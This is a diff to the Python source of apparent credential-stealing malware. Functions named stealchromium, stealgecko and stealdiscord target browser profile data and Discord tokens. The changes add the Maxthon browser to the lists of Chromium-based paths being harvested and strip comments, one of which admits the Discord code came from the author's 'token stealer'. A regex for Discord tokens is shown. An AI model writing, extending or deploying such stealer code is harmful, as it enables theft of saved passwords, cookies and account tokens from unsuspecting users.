@@ -690,7 +690,7 @@ def stealchromium():
             'Orbitum': {'path': localappdata + '\\Orbitum\\User Data', 'localstate': localappdata + '\\Orbitum\\User Data\\Local State'}, #(?)
             'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
             '7Star': {'path': localappdata + '\\7Star\\7Star\\User Data', 'localstate': localappdata + '\\7Star\\7Star\\User Data\\Local State'},
-            
+            'Maxthon': {'path': localappdata + '\\Maxthon\\User Data', 'localstate': localappdata + '\\Maxthon\\User Data\\Local State'},
             'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State'},
             'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
             'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
@@ -1107,7 +1107,7 @@ def stealgecko():
                        pass
 
 
-def stealdiscord(): #stole this from my token stealer 
+def stealdiscord():
     tokens = set()
     
     regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
@@ -1127,7 +1127,7 @@ def stealdiscord(): #stole this from my token stealer
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
     '0AVG': os.path.join(local, 'AVG', 'Browser', 'User Data'),
     '0Supermium': os.path.join(local, 'Supermium', 'User Data'),
-    '0Escosia': os.path.join(local, 'EscosiaBrowser', 'User Data'), #FUCK THE POLAR BEARS
+    '0Escosia': os.path.join(local, 'EscosiaBrowser', 'User Data'), 
     '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
@@ -1136,6 +1136,7 @@ def stealdiscord(): #stole this from my token stealer
     '0SamsungInternet': os.path.join(local, 'Samsung', 'Internet', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
     '0Shift': os.path.join(local, 'Shift', 'User Data'),
+    '0Maxthon': os.path.join(local, 'Maxthon', 'User Data'),
     '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
     '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
     '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
